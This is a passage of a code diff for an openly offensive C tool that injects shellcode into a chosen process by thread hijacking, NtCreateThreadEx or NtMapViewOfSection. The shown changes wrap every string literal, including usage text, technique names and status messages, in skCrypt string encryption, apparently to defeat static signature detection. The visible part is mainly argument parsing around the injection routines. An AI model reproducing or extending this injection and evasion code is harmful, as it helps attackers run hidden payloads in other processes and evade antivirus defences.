+		printf(skCrypt("[+] Shellcode Output:\n%s\n"), output);
 		free(output);
 	
 	}
@@ -629,11 +630,11 @@ BOOL InjectNtMapViewOfSection(CHAR* processName, LPVOID shellcode, SIZE_T shellc
 }
 
 VOID PrintUsage() {
-	printf("Usage: interactive-execute-shellcode.exe --technique <technique> --process <process> --shellcode <shellcode>\n");
-	printf("Techniques:\n");
-	printf("\tThreadHijacking\n");
-	printf("\tNtCreateThreadEx\n");
-	printf("\tNtMapViewOfSection\n");
+	printf(skCrypt("Usage: interactive-execute-shellcode.exe --technique <technique> --process <process> --shellcode <shellcode>\n"));
+	printf(skCrypt("Techniques:\n"));
+	printf(skCrypt("\tThreadHijacking\n"));
+	printf(skCrypt("\tNtCreateThreadEx\n"));
+	printf(skCrypt("\tNtMapViewOfSection\n"));
 
 }
 
@@ -651,11 +652,11 @@ int main(int argc, char** argv) {
 	}
 	
 	for (int i = 1; i < argc; i++) {
-		if (strcmp(argv[i], "--technique") == 0) {
+		if (strcmp(argv[i], skCrypt("--technique")) == 0) {
 			if (i + 1 < argc) {
 
 				// Thread Hijacking
-				if (strcmp(argv[i + 1], "ThreadHijacking") == 0) {
+				if (strcmp(argv[i + 1], skCrypt("ThreadHijacking")) == 0) {
 					// Thread Hijacking
 					ParseArguments(argc, argv, processName, shellcodeName);
 					if (!ReadShellcodeFile(shellcodeName, &shellcode, &shellcodeSize)) {
@@ -670,9 +671,9 @@ int main(int argc, char** argv) {
 				}
 
 				// NtCreateThreadEx
-				else if (strcmp(argv[i + 1], "NtCreateThreadEx") == 0) {
+				else if (strcmp(argv[i + 1], skCrypt("NtCreateThreadEx")) == 0) {
 					// NtCreateThreadEx
-					printf("[+] NtCreateThreadEx Has been chosen!\n");
+					printf(skCrypt("[+] NtCreateThreadEx Has been chosen!\n"));
 					ParseArguments(argc, argv, processName, shellcodeName);
 					if (!ReadShellcodeFile(shellcodeName, &shellcode, &shellcodeSize)) {
 						return 1;
@@ -685,7 +686,7 @@ int main(int argc, char** argv) {
 				}
 
 				// NtMapViewOfSection
-				else if (strcmp(argv[i + 1], "NtMapViewOfSection") == 0) {
+				else if (strcmp(argv[i + 1], skCrypt("NtMapViewOfSection")) == 0) {
 					// NtMapViewOfSection
 					ParseArguments(argc, argv, processName, shellcodeName);
 					if (!ReadShellcodeFile(shellcodeName, &shellcode, &shellcodeSize)) {
@@ -698,14 +699,14 @@ int main(int argc, char** argv) {
 
 				}
 				else {
-					printf("[-] Invalid technique\n");
+					printf(skCrypt("[-] Invalid technique\n"));
 					PrintUsage();
 					return 1;
 			}
 
 
 			} else {
-				printf("[-] Invalid technique\n");
+				printf(skCrypt("[-] Invalid technique\n"));
 				PrintUsage();
 				return 1;
 			}
@@ -713,7 +714,7 @@ int main(int argc, char** argv) {
 		}
 
 	}
-	printf("[-] Invalid technique\n");
+	printf(skCrypt("[-] Invalid technique\n"));
 	PrintUsage();
 
 	return 0;
